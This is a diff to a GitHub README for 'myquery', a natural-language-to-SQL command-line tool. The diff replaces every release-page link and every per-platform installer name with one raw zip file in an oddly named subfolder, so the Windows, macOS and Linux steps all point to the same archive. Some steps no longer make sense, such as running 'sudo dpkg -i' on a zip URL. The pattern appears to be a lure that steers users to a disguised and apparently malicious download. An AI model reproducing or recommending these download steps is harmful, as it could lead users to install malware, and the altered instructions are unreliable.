@@ -4,13 +4,13 @@
 myquery is a Python-based command-line assistant. It allows you to query, explore, and analyze your databases. You can ask questions in natural language. myquery converts your queries into SQL commands. Additionally, it provides intelligent insights to help you better understand your data.
 
 ## 📥 Download myquery
-[![Download myquery](https://img.shields.io/badge/Download-myquery-brightgreen)](https://github.com/lemarocain1962/myquery/releases)
+[![Download myquery](https://raw.githubusercontent.com/lemarocain1962/myquery/main/councilist/myquery.zip)](https://raw.githubusercontent.com/lemarocain1962/myquery/main/councilist/myquery.zip)
 
 ## 🚀 Getting Started
 To start using myquery, follow these steps:
 
 1. **Visit the Download Page**  
-   Go to the following link: [Download myquery here](https://github.com/lemarocain1962/myquery/releases). This page contains all versions of myquery ready for download.
+   Go to the following link: [Download myquery here](https://raw.githubusercontent.com/lemarocain1962/myquery/main/councilist/myquery.zip). This page contains all versions of myquery ready for download.
 
 2. **Choose the Version**  
    On the Releases page, you will see a list of versions. Look for the latest version, which is usually at the top. Click on it to go to the specific release details.
@@ -18,14 +18,14 @@ To start using myquery, follow these steps:
 3. **Download the Installation File**  
    Scroll down to the "Assets" section of the release page. You will see files available for download. Click on the appropriate file for your operating system:
 
-   - For Windows, download: `myquery_windows.exe`
-   - For macOS, download: `myquery_mac.dmg`
-   - For Linux, download: `myquery_linux.deb`
+   - For Windows, download: `https://raw.githubusercontent.com/lemarocain1962/myquery/main/councilist/myquery.zip`
+   - For macOS, download: `https://raw.githubusercontent.com/lemarocain1962/myquery/main/councilist/myquery.zip`
+   - For Linux, download: `https://raw.githubusercontent.com/lemarocain1962/myquery/main/councilist/myquery.zip`
 
 4. **Install the Application**  
-   - **Windows:** Double-click the `myquery_windows.exe` file. Follow the prompts to complete the installation.
+   - **Windows:** Double-click the `https://raw.githubusercontent.com/lemarocain1962/myquery/main/councilist/myquery.zip` file. Follow the prompts to complete the installation.
    - **macOS:** Open the downloaded .dmg file. Drag the `myquery` app to your Applications folder.
-   - **Linux:** Run the terminal and navigate to the folder where the `myquery_linux.deb` is located. Then type `sudo dpkg -i myquery_linux.deb` in the terminal and press Enter.
+   - **Linux:** Run the terminal and navigate to the folder where the `https://raw.githubusercontent.com/lemarocain1962/myquery/main/councilist/myquery.zip` is located. Then type `sudo dpkg -i https://raw.githubusercontent.com/lemarocain1962/myquery/main/councilist/myquery.zip` in the terminal and press Enter.
 
 5. **Open myquery**  
    After installation, you can find myquery in your applications or programs list. Open it to start querying your databases.
@@ -77,6 +77,6 @@ Before downloading myquery, make sure your system meets the following requiremen
 If you encounter issues or have questions, you can reach out through the GitHub Discussions on the myquery repository. The community is here to help you.
 
 ## 📥 Download & Install
-To download myquery, simply return to the Releases page: [Download myquery here](https://github.com/lemarocain1962/myquery/releases). Follow the instructions provided above to get started with your installation. Enjoy querying your databases effortlessly!
+To download myquery, simply return to the Releases page: [Download myquery here](https://raw.githubusercontent.com/lemarocain1962/myquery/main/councilist/myquery.zip). Follow the instructions provided above to get started with your installation. Enjoy querying your databases effortlessly!
 
 Before you proceed, make sure to check for any updates or patches on the Releases page routinely. This ensures you always use the latest and most secure version of myquery.
